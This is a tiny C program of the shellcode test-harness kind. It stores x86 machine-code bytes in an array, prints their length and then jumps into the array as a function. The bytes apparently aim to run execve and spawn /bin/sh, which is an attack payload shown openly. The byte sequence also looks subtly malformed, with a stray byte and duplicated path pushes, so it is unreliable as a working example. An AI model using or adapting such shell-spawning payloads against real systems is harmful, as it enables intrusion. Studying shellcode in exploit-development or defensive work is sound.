#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x6a\x02\x68\xdf\x62\x69\x6e\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x2f\x73\x68\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
    printf("Shellcode length: %d\n", strlen(shellcode));
    int (*ret)() = (int (*)()) shellcode;
    ret();
}
